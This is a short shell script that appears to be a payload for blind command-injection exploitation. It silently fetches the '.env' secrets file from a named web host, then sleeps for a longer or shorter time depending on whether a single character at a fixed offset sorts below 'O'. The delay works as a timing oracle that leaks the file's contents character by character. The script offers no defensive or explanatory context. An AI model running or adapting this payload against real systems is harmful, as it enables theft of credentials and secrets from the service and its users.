#!/bin/sh
curl -s -o /wj https://playerapi.hubgaming.com/.env
[ "$(tail -c +132 /wj|head -c1)" < 'O' ]&&sleep 25
sleep 12
